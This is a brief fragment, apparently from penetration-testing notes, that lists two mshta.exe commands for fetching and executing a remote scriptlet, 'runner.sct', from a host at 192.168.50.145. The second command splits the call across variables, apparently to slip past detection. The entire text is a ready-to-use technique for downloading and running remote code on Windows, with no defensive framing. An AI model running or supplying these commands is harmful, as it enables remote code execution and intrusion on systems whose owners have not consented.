We can execute `runner.sct` remotely with:

- `mshta.exe "javascript:GetObject('script:http://192.168.50.145/runner.sct');close();"`
- `mshta.exe "javascript:a=GetObject;b='script:http://192.168.50.145/runner.sct';a(b);close();"`
